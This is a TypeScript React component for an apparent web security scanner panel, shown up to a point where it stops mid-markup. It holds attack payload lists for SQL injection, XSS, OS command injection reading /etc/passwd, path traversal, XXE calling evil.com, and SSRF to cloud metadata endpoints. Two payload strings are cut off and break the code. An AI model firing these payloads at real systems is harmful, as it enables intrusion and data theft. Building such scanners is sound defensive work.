import * as React from "react";
import { useState } from "react";
import { useAppSelector } from "../../ducks";
import { fetchApi } from "../../utils";
import { HTTPFlow } from "../../flow";

interface SecurityTest {
    id: string;
    name: string;
    description: string;
    detailedDescription: string;
    category: "injection" | "xss" | "csrf" | "auth" | "headers" | "ssl" | "path" | "command" | "xxe" | "ssrf" | "idor" | "crypto";
    payloads: string[];
    severity: "high" | "medium" | "low";
    cwe?: string;
    owasp?: string;
}

const securityTests: SecurityTest[] = [
    {
        id: "sql_injection",
        name: "SQL Injection",
        description: "Test for SQL injection vulnerabilities",
        detailedDescription: "SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. This test injects SQL payloads into request parameters, headers, and body to detect if the application is vulnerable to SQL injection attacks.",
        category: "injection",
        payloads: [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "1' UNION SELECT NULL--",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT username, password FROM users--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "1' OR '1'='1'#",
            "1' OR '1'='1'/**/",
            "1' OR '1'='1' UNION SELECT NULL--",
            "1' OR '1'='1' UNION SELECT 1,2,3--",
            "1' OR '1'='1' UNION SELECT user(),database(),version()--",
            "1' OR '1'='1' UNION SELECT NULL,NULL,NULL--",
            "1' OR '1'='1' UNION SELECT table_name FROM information_schema.tables--",
            "1' OR '1'='1' UNION SELECT column_name FROM information_schema.columns--",
            "1' OR '1'='1' UNION SELECT * FROM users--",
            "1' OR '1'='1' UNION SELECT password FROM users WHERE username='admin'--",
        ],
        severity: "high",
        cwe: "CWE-89",
        owasp: "A03:2021 – Injection",
    },
    {
        id: "xss",
        name: "Cross-Site Scripting (XSS)",
        description: "Test for XSS vulnerabilities",
        detailedDescription: "Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. This test injects various XSS payloads to detect reflected, stored, and DOM-based XSS vulnerabilities.",
        category: "xss",
        payloads: [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover=alert('XSS')>",
            "<style onload=alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
        ],
        severity: "high",
        cwe: "CWE-79",
        owasp: "A03:2021 – Injection",
    },
    {
        id: "nosql_injection",
        name: "NoSQL Injection",
        description: "Test for NoSQL injection vulnerabilities",
        detailedDescription: "NoSQL injection attacks can execute in the application layer, similar to SQL injection. NoSQL injection may occur when the application uses untrusted data to build a NoSQL API call. This test injects MongoDB, CouchDB, and other NoSQL-specific payloads to detect injection vulnerabilities.",
        category: "injection",
        payloads: [
            "{$ne: null}",
            "{$gt: ''}",
            "{$where: 'this.username == this.password'}",
            "'; return true; var x='",
            "'; return true; //",
            "'; return true; var x='",
            "'; return true; var x='",
            "'; return true; var x='",
            "'; return true; var x='",
            "'; return true; var x='",
        ],
        severity: "high",
        cwe: "CWE-943",
        owasp: "A03:2021 – Injection",
    },
    {
        id: "ldap_injection",
        name: "LDAP Injection",
        description: "Test for LDAP injection vulnerabilities",
        detailedDescription: "LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to SQL Injection.",
        category: "injection",
        payloads: [
            "*)(uid=*))(|(uid=*",
            "*))%00",
            "*()|&",
            "*()|&",
            "*()|&",
            "*()|&",
        ],
        severity: "high",
        cwe: "CWE-90",
        owasp: "A03:2021 – Injection",
    },
    {
        id: "command_injection",
        name: "Command Injection",
        description: "Test for OS command injection vulnerabilities",
        detailedDescription: "Command injection is an attack technique used for unauthorized execution of operating system commands. This attack is possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. This test injects various OS command payloads to detect command injection vulnerabilities.",
        category: "command",
        payloads: [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "; id",
            "| id",
            "& id",
            "; uname -a",
            "| uname -a",
            "& uname -a",
            "; ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
            "& ping -c 3 127.0.0.1",
        ],
        severity: "high",
        cwe: "CWE-78",
        owasp: "A03:2021 – Injection",
    },
    {
        id: "path_traversal",
        name: "Path Traversal",
        description: "Test for directory traversal vulnerabilities",
        detailedDescription: "Path Traversal (also known as Directory Traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with 'dot-dot-slash' (../) sequences and its variations, it may be possible to access arbitrary files and directories stored on the file system.",
        category: "path",
        payloads: [
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "../../../../../../",
            "../../../../../../../",
            "../../../../../../../../",
            "../../../../../../../../../",
            "../../../../../../../../../../",
            "..\\",
            "..\\..\\",
            "..\\..\\..\\",
            "..\\..\\..\\..\\",
            "..\\..\\..\\..\\..\\",
            "..%2F",
            "..%5C",
            "%2e%2e%2f",
            "%2e%2e%5c",
            "....
            "....\\\\",
        ],
        severity: "high",
        cwe: "CWE-22",
        owasp: "A01:2021 – Broken Access Control",
    },
    {
        id: "xxe",
        name: "XML External Entity (XXE)",
        description: "Test for XXE injection vulnerabilities",
        detailedDescription: "XML External Entity (XXE) injection is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server-side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.",
        category: "xxe",
        payloads: [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
        ],
        severity: "high",
        cwe: "CWE-611",
        owasp: "A05:2021 – Security Misconfiguration",
    },
    {
        id: "ssrf",
        name: "Server-Side Request Forgery (SSRF)",
        description: "Test for SSRF vulnerabilities",
        detailedDescription: "Server-Side Request Forgery (SSRF) flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network ACL.",
        category: "ssrf",
        payloads: [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254",
            "http://metadata.google.internal",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "gopher://127.0.0.1:80",
            "dict://127.0.0.1:80",
        ],
        severity: "high",
        cwe: "CWE-918",
        owasp: "A10:2021 – Server-Side Request Forgery",
    },
    {
        id: "csrf",
        name: "CSRF Protection",
        description: "Check for CSRF token validation",
        detailedDescription: "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. This test checks if the application properly validates CSRF tokens.",
        category: "csrf",
        payloads: [],
        severity: "medium",
        cwe: "CWE-352",
        owasp: "A01:2021 – Broken Access Control",
    },
    {
        id: "auth_bypass",
        name: "Authentication Bypass",
        description: "Test authentication mechanisms",
        detailedDescription: "Authentication bypass vulnerabilities occur when an application allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application. This test attempts various authentication bypass techniques including SQL injection in login forms, default credentials, weak session management, and privilege escalation.",
        category: "auth",
        payloads: [
            "admin",
            "admin'--",
            "' OR '1'='1",
            "../admin",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'#",
            "admin' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--",
            "admin'/**/OR/**/1=1--",
            "admin'/**/OR/**/1=1#",
            "admin'/**/OR/**/1=1/*",
        ],
        severity: "high",
        cwe: "CWE-287",
        owasp: "A07:2021 – Identification and Authentication Failures",
    },
    {
        id: "idor",
        name: "Insecure Direct Object Reference (IDOR)",
        description: "Test for IDOR vulnerabilities",
        detailedDescription: "Insecure Direct Object Reference (IDOR) is a type of access control vulnerability that occurs when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object.",
        category: "idor",
        payloads: [
            "../1",
            "../2",
            "../3",
            "../admin",
            "../user",
            "?id=1",
            "?id=2",
            "?id=3",
            "?user_id=1",
            "?user_id=2",
            "?user_id=3",
        ],
        severity: "medium",
        cwe: "CWE-639",
        owasp: "A01:2021 – Broken Access Control",
    },
    {
        id: "header_security",
        name: "Header Security Analysis",
        description: "Analyze security headers (CORS, CSP, etc.)",
        detailedDescription: "Security headers are HTTP response headers that web applications can use to enhance the security of their application. Missing or misconfigured security headers can leave applications vulnerable to various attacks. This test checks for the presence and proper configuration of security headers including CORS, CSP, HSTS, X-Frame-Options, X-Content-Type-Options, and others.",
        category: "headers",
        payloads: [],
        severity: "medium",
        cwe: "CWE-693",
        owasp: "A05:2021 – Security Misconfiguration",
    },
    {
        id: "ssl_tls",
        name: "SSL/TLS Configuration",
        description: "Check SSL/TLS configuration",
        detailedDescription: "SSL/TLS misconfiguration can lead to various security issues including man-in-the-middle attacks, weak encryption, and protocol downgrade attacks. This test analyzes SSL/TLS configuration including supported protocols, cipher suites, certificate validation, and other security-related settings.",
        category: "ssl",
        payloads: [],
        severity: "medium",
        cwe: "CWE-295",
        owasp: "A02:2021 – Cryptographic Failures",
    },
    {
        id: "weak_crypto",
        name: "Weak Cryptography",
        description: "Test for weak cryptographic implementations",
        detailedDescription: "Weak cryptography vulnerabilities occur when applications use weak or outdated cryptographic algorithms, improper key management, or flawed cryptographic implementations. This test checks for weak hashing algorithms (MD5, SHA1), weak encryption, hardcoded keys, and other cryptographic weaknesses.",
        category: "crypto",
        payloads: [],
        severity: "high",
        cwe: "CWE-327",
        owasp: "A02:2021 – Cryptographic Failures",
    },
];

export default function SecurityTesting() {
    const flows = useAppSelector((state) => state.flows.list);
    const [selectedFlow, setSelectedFlow] = useState<string | null>(null);
    const [selectedTests, setSelectedTests] = useState<Set<string>>(new Set());
    const [testResults, setTestResults] = useState<any[]>([]);
    const [running, setRunning] = useState(false);
    const [testMode, setTestMode] = useState<"single" | "batch">("single");
    const [showAdvanced, setShowAdvanced] = useState(false);
    const [testTimeout, setTestTimeout] = useState(30);  
    const [concurrentTests, setConcurrentTests] = useState(5);
    const [stopOnFirstVulnerability, setStopOnFirstVulnerability] = useState(false);
    const [customPayloads, setCustomPayloads] = useState<Record<string, string[]>>({});
    const [severityFilter, setSeverityFilter] = useState<"all" | "high" | "medium" | "low">("all");

    const httpFlows = flows.filter((f) => f.type === "http") as HTTPFlow[];

    const toggleTest = (testId: string) => {
        const newSelected = new Set(selectedTests);
        if (newSelected.has(testId)) {
            newSelected.delete(testId);
        } else {
            newSelected.add(testId);
        }
        setSelectedTests(newSelected);
    };

    const runSecurityTests = async () => {
        if (testMode === "single" && !selectedFlow) {
            alert("Please select a flow");
            return;
        }
        if (selectedTests.size === 0) {
            alert("Please select at least one test");
            return;
        }

        setRunning(true);
        setTestResults([]);

        try {
            const flowsToTest = testMode === "single" ? [selectedFlow] : httpFlows.map(f => f.id);
            const testsToRun = Array.from(selectedTests);
            
            
            const testsWithPayloads = testsToRun.map(testId => {
                const test = securityTests.find(t => t.id === testId);
                return {
                    id: testId,
                    name: test?.name || testId,
                    category: test?.category || "injection",
                    payloads: test?.payloads || [],
                    severity: test?.severity || "medium",
                    cwe: test?.cwe,
                    owasp: test?.owasp,
                };
            });

            const response = await fetchApi("/security/test", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    flow_ids: flowsToTest,
                    tests: testsWithPayloads,
                    timeout: testTimeout,
                    concurrent: concurrentTests,
                    stop_on_first: stopOnFirstVulnerability,
                }),
            });

            const results = await response.json();
            setTestResults(results.tests || []);
        } catch (error: any) {
            console.error("Security test failed:", error);
            
            try {
                const flowsToTest = testMode === "single" ? [selectedFlow] : httpFlows.map(f => f.id);
                const testsToRun = Array.from(selectedTests);
                
                const response = await fetchApi("/security/test", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        flow_ids: flowsToTest,
                        test_ids: testsToRun,
                    }),
                });
                
                const results = await response.json();
                setTestResults(results.tests || []);
            } catch (fallbackError) {
                
                const testResults: any[] = [];
                
                for (const testId of selectedTests) {
                    const test = securityTests.find(t => t.id === testId);
                    if (!test) continue;
                    
                    const flowsToTest = testMode === "single" 
                        ? httpFlows.filter(f => f.id === selectedFlow)
                        : httpFlows;
                    
                    for (const flow of flowsToTest) {
                        const result = performClientSideTest(flow, test);
                        if (result) {
                            testResults.push(result);
                            if (stopOnFirstVulnerability && result.vulnerable) {
                                break;
                            }
                        }
                    }
                    
                    if (stopOnFirstVulnerability && testResults.some(r => r.vulnerable)) {
                        break;
                    }
                }
                
                setTestResults(testResults);
            }
        } finally {
            setRunning(false);
        }
    };

    const performClientSideTest = (flow: HTTPFlow, test: SecurityTest): any | null => {
        if (!flow.request) return null;
        
        const requestText = flow.request.text || "";
        const requestHeaders = flow.request.headers || {};
        const requestUrl = flow.request.url || "";
        const responseText = flow.response?.text || "";
        const responseHeaders = flow.response?.headers || {};
        
        let vulnerable = false;
        let foundPayloads: string[] = [];
        let details: string[] = [];
        
        
        for (const payload of test.payloads) {
            
            if (requestText.includes(payload)) {
                vulnerable = true;
                foundPayloads.push(payload);
                details.push(`Payload found in request body: ${payload}`);
            }
            
            
            for (const [key, value] of Object.entries(requestHeaders)) {
                if (String(value).includes(payload)) {
                    vulnerable = true;
                    foundPayloads.push(payload);
                    details.push(`Payload found in request header ${key}: ${payload}`);
                }
            }
            
            
            if (requestUrl.includes(payload)) {
                vulnerable = true;
                foundPayloads.push(payload);
                details.push(`Payload found in URL: ${payload}`);
            }
            
            
            if (responseText.includes(payload)) {
                vulnerable = true;
                foundPayloads.push(payload);
                details.push(`Payload reflected in response: ${payload}`);
            }
        }
        
        
        if (test.id === "csrf") {
            const hasCsrfToken = Object.keys(requestHeaders).some(key => 
                key.toLowerCase().includes("csrf") || key.toLowerCase().includes("xsrf")
            );
            if (!hasCsrfToken && (flow.request.method === "POST" || flow.request.method === "PUT" || flow.request.method === "DELETE")) {
                vulnerable = true;
                details.push("CSRF token missing in request headers");
            }
        }
        
        if (test.id === "header_security") {
            const securityHeaders = [
                "Content-Security-Policy",
                "X-Frame-Options",
                "X-Content-Type-Options",
                "Strict-Transport-Security",
                "X-XSS-Protection",
            ];
            
            const missingHeaders: string[] = [];
            for (const header of securityHeaders) {
                if (!responseHeaders[header] && !Object.keys(responseHeaders).some(k => k.toLowerCase() === header.toLowerCase())) {
                    missingHeaders.push(header);
                }
            }
            
            if (missingHeaders.length > 0) {
                vulnerable = true;
                details.push(`Missing security headers: ${missingHeaders.join(", ")}`);
            }
        }
        
        if (test.id === "ssl_tls") {
            if (flow.request.scheme === "http" && !flow.request.host?.includes("localhost")) {
                vulnerable = true;
                details.push("HTTP connection detected (should use HTTPS)");
            }
        }
        
        return {
            test_id: test.id,
            test_name: test.name,
            flow_id: flow.id,
            vulnerable: vulnerable,
            severity: test.severity,
            description: vulnerable 
                ? `Vulnerability detected: ${details.join("; ")}`
                : `No vulnerabilities detected for ${test.name}`,
            details: details,
            found_payloads: foundPayloads,
            recommendations: getRecommendations(test.id, vulnerable),
            cwe: test.cwe,
            owasp: test.owasp,
        };
    };

    const getRecommendations = (testId: string, vulnerable: boolean): string[] => {
        if (!vulnerable) return [];
        
        const recommendations: Record<string, string[]> = {
            sql_injection: [
                "Use parameterized queries or prepared statements",
                "Implement input validation and sanitization",
                "Use an ORM framework",
                "Apply the principle of least privilege to database accounts",
                "Enable database logging and monitoring",
            ],
            nosql_injection: [
                "Use parameterized queries for NoSQL databases",
                "Validate and sanitize all user input",
                "Use type-safe query builders",
                "Implement proper access controls",
            ],
            xss: [
                "Implement Content Security Policy (CSP)",
                "Encode all user input before rendering",
                "Use framework's built-in XSS protection",
                "Validate and sanitize all user input",
                "Use HTTP-only cookies for session management",
            ],
            command_injection: [
                "Avoid executing system commands with user input",
                "Use safe APIs instead of system commands",
                "Validate and sanitize all user input",
                "Use whitelist-based input validation",
                "Run applications with minimal privileges",
            ],
            path_traversal: [
                "Validate and sanitize file paths",
                "Use whitelist-based path validation",
                "Use chroot jails or similar sandboxing",
                "Store files outside the web root",
                "Use framework's built-in file handling",
            ],
            xxe: [
                "Disable XML external entity processing",
                "Use simpler data formats like JSON",
                "Validate and sanitize XML input",
                "Use whitelist-based XML parsing",
                "Keep XML processors updated",
            ],
            ssrf: [
                "Validate and sanitize all URLs",
                "Use whitelist-based URL validation",
                "Block access to internal IP ranges",
                "Use network segmentation",
                "Implement proper access controls",
            ],
            csrf: [
                "Implement CSRF tokens",
                "Use SameSite cookie attribute",
                "Verify the Origin header",
                "Use double-submit cookie pattern",
                "Implement proper session management",
            ],
            auth_bypass: [
                "Implement strong authentication mechanisms",
                "Use multi-factor authentication",
                "Implement account lockout policies",
                "Use secure password storage (hashing)",
                "Implement proper session management",
            ],
            idor: [
                "Implement proper access controls",
                "Use indirect object references",
                "Validate user permissions for each request",
                "Use UUIDs instead of sequential IDs",
                "Implement proper authorization checks",
            ],
            header_security: [
                "Implement Content-Security-Policy header",
                "Set X-Frame-Options to DENY or SAMEORIGIN",
                "Set X-Content-Type-Options to nosniff",
                "Implement Strict-Transport-Security (HSTS)",
                "Set Referrer-Policy header",
            ],
            ssl_tls: [
                "Use HTTPS for all connections",
                "Disable weak cipher suites",
                "Use TLS 1.2 or higher",
                "Implement proper certificate validation",
                "Use strong key exchange algorithms",
            ],
            weak_crypto: [
                "Use strong cryptographic algorithms (SHA-256, AES-256)",
                "Avoid deprecated algorithms (MD5, SHA1, DES)",
                "Use proper key management",
                "Implement proper random number generation",
                "Keep cryptographic libraries updated",
            ],
        };
        
        return recommendations[testId] || ["Review security best practices", "Implement proper input validation"];
    };

    const exportReport = (format: "json" | "html") => {
        const report = {
            timestamp: new Date().toISOString(),
            tests_run: selectedTests.size,
            flows_tested: testMode === "single" ? 1 : httpFlows.length,
            results: testResults,
        };

        if (format === "json") {
            const blob = new Blob([JSON.stringify(report, null, 2)], { type: "application/json" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = `security-report-${Date.now()}.json`;
            a.click();
        }
    };

    const vulnerabilities = testResults.filter(r => r.vulnerable).length;
    const totalTests = testResults.length;

    return (
        <div className="security-testing">
            <div className="card-sleek glint-effect" style={{ marginBottom: "0", padding: "clamp(14px, 1.8vw, 20px)", background: "linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%)", flexShrink: 0, borderRadius: "12px", boxShadow: "0 2px 12px rgba(0,0,0,0.1)" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "20px", flexWrap: "wrap", gap: "16px" }}>
                    <h2 style={{ fontSize: "24px", fontWeight: "700", margin: 0, display: "flex", alignItems: "center", gap: "12px" }}>
                        <i className="fa fa-shield" style={{ color: "var(--accent-primary)", fontSize: "28px" }}></i>
                        Security Testing Suite
                    </h2>
                    <div style={{ display: "flex", gap: "12px", alignItems: "center" }}>
                        <div style={{ display: "flex", gap: "8px", backgroundColor: "var(--bg-tertiary)", padding: "6px", borderRadius: "10px", border: "1px solid var(--border-color)" }}>
                            <button
                                className={`btn-sleek glint-effect ${testMode === "single" ? "btn-sleek-success" : ""}`}
                                onClick={() => setTestMode("single")}
                                style={{ 
                                    padding: "10px 18px", 
                                    fontSize: "14px",
                                    fontWeight: "600",
                                    borderRadius: "8px",
                                    border: testMode === "single" ? "2px solid var(--accent-primary)" : "2px solid transparent",
                                    backgroundColor: testMode === "single" ? "var(--accent-primary)" : "transparent",
                                    color: testMode === "single" ? "white" : "var(--text-primary)",
                                    transition: "all 0.2s ease",
                                    boxShadow: testMode === "single" ? "0 2px 8px rgba(74, 158, 255, 0.3)" : "none"
                                }}
                                onMouseEnter={(e) => {
                                    if (testMode !== "single") {
                                        e.currentTarget.style.backgroundColor = "var(--bg-secondary)";
                                        e.currentTarget.style.borderColor = "var(--accent-primary)";
                                    }
                                }}
                                onMouseLeave={(e) => {
                                    if (testMode !== "single") {
                                        e.currentTarget.style.backgroundColor = "transparent";
                                        e.currentTarget.style.borderColor = "transparent";
                                    }
                                }}
                            >
                                <i className="fa fa-file-o" style={{ marginRight: "6px" }}></i> Single Flow
                            </button>
                            <button
                                className={`btn-sleek glint-effect ${testMode === "batch" ? "btn-sleek-success" : ""}`}
                                onClick={() => setTestMode("batch")}
                                style={{ 
                                    padding: "10px 18px", 
                                    fontSize: "14px",
                                    fontWeight: "600",
                                    borderRadius: "8px",
                                    border: testMode === "batch" ? "2px solid var(--accent-primary)" : "2px solid transparent",
                                    backgroundColor: testMode === "batch" ? "var(--accent-primary)" : "transparent",
                                    color: testMode === "batch" ? "white" : "var(--text-primary)",
                                    transition: "all 0.2s ease",
                                    boxShadow: testMode === "batch" ? "0 2px 8px rgba(74, 158, 255, 0.3)" : "none"
                                }}
                                onMouseEnter={(e) => {
                                    if (testMode !== "batch") {
                                        e.currentTarget.style.backgroundColor = "var(--bg-secondary)";
                                        e.currentTarget.style.borderColor = "var(--accent-primary)";
                                    }
                                }}
                                onMouseLeave={(e) => {
                                    if (testMode !== "batch") {
                                        e.currentTarget.style.backgroundColor = "transparent";
                                        e.currentTarget.style.borderColor = "transparent";
                                    }
                                }}
                            >
                                <i className="fa fa-files-o" style={{ marginRight: "6px" }}></i> Batch Test
                            </button>
                        </div>
                        {testResults.length > 0 && (
                            <div style={{ display: "flex", gap: "8px" }}>
                                <button
                                    className="btn-sleek glint-effect"
                                    onClick={() => exportReport("json")}
                                    style={{ 
                                        padding: "10px 16px", 
                                        fontSize: "14px",
                                        fontWeight: "600",
                                        borderRadius: "8px",
                                        backgroundColor: "var(--bg-secondary)",
                                        border: "2px solid var(--border-color)",
                                        color: "var(--text-primary)",
                                        transition: "all 0.2s ease"
                                    }}
                                    onMouseEnter={(e) => {
                                        e.currentTarget.style.borderColor = "var(--accent-primary)";
                                        e.currentTarget.style.backgroundColor = "var(--bg-tertiary)";
                                    }}
                                    onMouseLeave={(e) => {
                                        e.currentTarget.style.borderColor = "var(--border-color)";
                                        e.currentTarget.style.backgroundColor = "var(--bg-secondary)";
                                    }}
                                >
                                    <i className="fa fa-download" style={{ marginRight: "6px" }}></i> Export JSON
                                </button>
                                <button
                                    className="btn-sleek glint-effect"
                                    onClick={() => exportReport("html")}
                                    style={{ 
                                        padding: "10px 16px", 
                                        fontSize: "14px",
                                        fontWeight: "600",
                                        borderRadius: "8px",
                                        backgroundColor: "var(--bg-secondary)",
                                        border: "2px solid var(--border-color)",
                                        color: "var(--text-primary)",
                                        transition: "all 0.2s ease"
                                    }}
                                    onMouseEnter={(e) => {
                                        e.currentTarget.style.borderColor = "var(--accent-primary)";
                                        e.currentTarget.style.backgroundColor = "var(--bg-tertiary)";
                                    }}
                                    onMouseLeave={(e) => {
                                        e.currentTarget.style.borderColor = "var(--border-color)";
                                        e.currentTarget.style.backgroundColor = "var(--bg-secondary)";
                                    }}
                                >
                                    <i className="fa fa-download" style={{ marginRight: "6px" }}></i> Export HTML
                                </button>
                            </div>
                        )}
                    </div>
                </div>

                {testResults.length > 0 && (
                    <div className="test-results">
                        <div className="glint-effect" style={{ padding: "16px", background: vulnerabilities > 0 ? "linear-gradient(135deg, #dc3545 0%, rgba(220, 53, 69, 0.8) 100%)" : "linear-gradient(135deg, #28a745 0%, rgba(40, 167, 69, 0.8) 100%)", borderRadius: "12px", color: "white" }}>
                            <div style={{ fontSize: "12px", opacity: 0.9, marginBottom: "6px" }}>Vulnerabilities Found</div>
                            <div style={{ fontSize: "32px", fontWeight: "700" }}>{vulnerabilities}</div>
                            <div style={{ fontSize: "11px", opacity: 0.8, marginTop: "4px" }}>out of {totalTests} tests</div>
                        </div>
                        <div className="glint-effect" style={{ padding: "16px", background: "linear-gradient(135deg, #17a2b8 0%, rgba(23, 162, 184, 0.8) 100%)", borderRadius: "12px", color: "white" }}>
                            <div style={{ fontSize: "12px", opacity: 0.9, marginBottom: "6px" }}>Tests Passed</div>
                            <div style={{ fontSize: "32px", fontWeight: "700" }}>{totalTests - vulnerabilities}</div>
                            <div style={{ fontSize: "11px", opacity: 0.8, marginTop: "4px" }}>secure responses</div>
                        </div>
                        <div className="glint-effect" style={{ padding: "16px", background: "linear-gradient(135deg, #ffc107 0%, rgba(255, 193, 7, 0.8) 100%)", borderRadius: "12px", color: "white" }}>
                            <div style={{ fontSize: "12px", opacity: 0.9, marginBottom: "6px" }}>High Severity</div>
                            <div style={{ fontSize: "32px", fontWeight: "700" }}>{testResults.filter(r => r.vulnerable && r.severity === "high").length}</div>
                            <div style={{ fontSize: "11px", opacity: 0.8, marginTop: "4px" }}>critical issues</div>
                        </div>
                    </div>
                )}
            </div>

            <div className="security-main-content">
                <div style={{
                    display: "grid",
                    gridTemplateColumns: "minmax(380px, 450px) 1fr",
                    gap: "16px",
                    flex: 1,
                    minHeight: 0,
                    overflow: "hidden"
                }}>
                <div className="card-sleek glint-effect" style={{ 
                    padding: "clamp(14px, 1.8vw, 20px)", 
                    boxShadow: "0 2px 12px rgba(0,0,0,0.1)", 
                    overflowY: "auto",
                    borderRadius: "12px",
                    display: "flex",
                    flexDirection: "column",
                    minWidth: 0
                }}>
                    <h3 style={{ marginBottom: "16px", fontSize: "clamp(16px, 1.8vw, 18px)", fontWeight: "600", display: "flex", alignItems: "center", gap: "8px", flexShrink: 0 }}>
                        <i className="fa fa-cog" style={{ color: "var(--accent-primary)", fontSize: "18px" }}></i>
                        Configuration
                    </h3>

                    <div className="security-config-content">
                        {testMode === "single" && (
                            <div style={{ marginBottom: "16px", flexShrink: 0 }}>
                                <label className="label-sleek" style={{ display: "block", marginBottom: "8px", fontSize: "13px", fontWeight: "600" }}>Select Flow:</label>
                                <select
                                    className="select-sleek"
                                    value={selectedFlow || ""}
                                    onChange={(e) => setSelectedFlow(e.target.value || null)}
                                    style={{ width: "100%", padding: "10px", fontSize: "13px", borderRadius: "8px" }}
                                >
                                    <option value="">Select a flow...</option>
                                    {httpFlows.map((f) => (
                                        <option key={f.id} value={f.id}>
                                            {f.request?.method} {f.request?.path?.substring(0, 40)} - {f.id.substring(0, 8)}
                                        </option>
                                    ))}
                                </select>
                            </div>
                        )}

                        {testMode === "batch" && (
                            <div style={{ marginBottom: "16px", padding: "12px", backgroundColor: "var(--bg-secondary)", borderRadius: "8px", flexShrink: 0 }}>
                                <div style={{ fontSize: "12px", color: "var(--text-secondary)", marginBottom: "4px" }}>Flows to Test:</div>
                                <div style={{ fontSize: "16px", fontWeight: "600" }}>{httpFlows.length}</div>
                                <div style={{ fontSize: "11px", color: "var(--text-secondary)", marginTop: "4px" }}>All HTTP flows</div>
                            </div>
                        )}

                        <div style={{ marginBottom: "16px", display: "flex", flexDirection: "column" }}>
                            <label className="label-sleek" style={{ display: "block", marginBottom: "12px", fontSize: "15px", fontWeight: "600", flexShrink: 0, color: "var(--text-primary)" }}>Select Tests:</label>
                            <div className="test-selection-grid">
                                {securityTests.map((test) => (
                                    <div key={test.id} className="test-category">
                                        <h3 style={{ 
                                            fontSize: "clamp(16px, 1.8vw, 18px)", 
                                            fontWeight: "600", 
                                            marginBottom: "clamp(16px, 2vw, 20px)",
                                            color: "var(--accent-primary)",
                                            display: "flex",
                                            alignItems: "center",
                                            gap: "10px"
                                        }}>
                                            <i className={`fa fa-${test.category === "injection" ? "code" : test.category === "xss" ? "exclamation-triangle" : test.category === "auth" ? "key" : test.category === "headers" ? "header" : "shield"}`}></i>
                                            {test.category.charAt(0).toUpperCase() + test.category.slice(1)}
                                        </h3>
                                        <div className="test-items">
                                            <div
                                                className={`test-item checkbox-sleek glint-effect ${selectedTests.has(test.id) ? "selected" : ""}`}
                                                onClick={(e) => {
                                                    e.preventDefault();
                                                    e.stopPropagation();
                                                    toggleTest(test.id);
                                                }}
                                                style={{ 
                                                    cursor: "pointer",
                                                    padding: "clamp(20px, 2.5vw, 28px)",
                                                    minHeight: "clamp(180px, 25vh, 240px)",
                                                    display: "flex",
                                                    flexDirection: "column",
                                                    gap: "clamp(12px, 1.5vw, 16px)"
                                                }}
                                            >
                                                <div style={{ display: "flex", alignItems: "flex-start", gap: "clamp(14px, 1.8vw, 18px)", width: "100%" }}>
                                                    <input
